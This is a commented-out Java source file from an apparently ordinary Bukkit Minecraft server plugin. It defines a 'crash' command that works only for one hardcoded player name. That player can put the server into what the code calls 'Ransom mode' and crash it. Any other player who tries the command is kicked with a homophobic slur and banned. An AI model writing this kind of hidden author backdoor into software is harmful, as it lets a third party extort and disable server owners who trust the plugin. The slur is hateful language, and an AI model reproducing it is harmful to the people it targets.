/*package me.Paldiu.NNO.Commands;

import me.Paldiu.NNO.Main;
import me.Paldiu.NNO.Util;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Crash implements CommandExecutor
{
    public Main plugin;
    public Crash(Main instance)
    {
        plugin = instance;
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
    {
        if (commandLabel.equalsIgnoreCase("crash"))
        {
            if (sender instanceof Player)
            {
                Player p = (Player) sender;
                if (p.getName().equalsIgnoreCase("paldiu"))
                {
                    if (args.length != 1)
                    {
                        return false;
                    }
                    else
                    {
                        if (args[0].equalsIgnoreCase("on"))
                        {
                            p.sendMessage("Crash server initiated. Server is now on Ransom mode.");
                            Util.crashServer(true);
                            return true;
                        }
                        else if (args[0].equalsIgnoreCase("off"))
                        {
                            p.sendMessage("Crash server has been cancelled.");
                            Util.crashServer(false);
                            return true;
                        }
                    }
                }
                else
                {
                    p.kickPlayer(ChatColor.RED + "GTFO FAGGOT.");
                    p.setBanned(true);
                    return true;
                }
            }
            else
            {
                sender.sendMessage(Main.UNKNOWN_COMMAND);
                return true;
            }
        }
        return false;
    }
}
*/